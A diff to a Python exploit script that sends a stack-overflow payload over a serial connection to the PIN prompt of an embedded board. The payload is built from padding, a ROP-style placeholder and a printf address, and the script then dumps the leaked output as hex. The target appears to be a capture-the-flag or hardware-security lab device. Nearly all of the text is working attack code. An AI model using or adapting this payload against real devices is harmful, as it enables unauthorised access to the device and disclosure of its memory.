@@ -2,18 +2,19 @@ from tqdm import tqdm
 import sys
 import serial
 
-arg1 = '\x88\xb3\x06\x04'
+arg1 = b'\x08\x07\x06\x04'
+# arg1 = 'ZZZZ'
 # rop1 = '\xec\x0c\x01\x04\x00\x00\x00\x00'
-rop1 = 8*'C'
-printf = '\x80\xe2\x04\x04'
+rop1 = 8*b'C'
+printf = b'\x80\xe2\x04\x04'
 username = "demo"
-pin = 14*'A' + arg1 + 12*'B'+ rop1 + printf
+pin = 16*b'A' + arg1 + 12*b'B'+ rop1 + printf
 
 username_prompt = "Enter your username: "
 pin_prompt = "Enter your PIN: "
 mesh_prompt = "mesh> "
 
-ser = serial.Serial("/dev/ttyUSB1", 115200)
+ser = serial.Serial("/dev/ttyUSB1", 115200, timeout=1)
 
 # read data from the serial device ser until the first argument is detected
 def recv_until(until, ser):
@@ -34,9 +35,14 @@ print("If you are hanging here you might want to restart the board")
 recv_until(username_prompt, ser)
 print("Starting to brute force logins!")
 ser.write((username + "\n").encode("utf-8"))
-ser.write((pin + "\n").encode("utf-8"))
+ser.write((pin + b"\x0a"))
 print("starting to read serial")
 a = ""
-while 1:
+cont = True
+while cont:
 #    print(str(ser.read(1))), end='')
-    print(ser.read(1).hex(), end='')
+    value = ser.read(10)
+    if(len(value) < 10):
+        cont = False
+    print(value.hex(), end='')
+print()
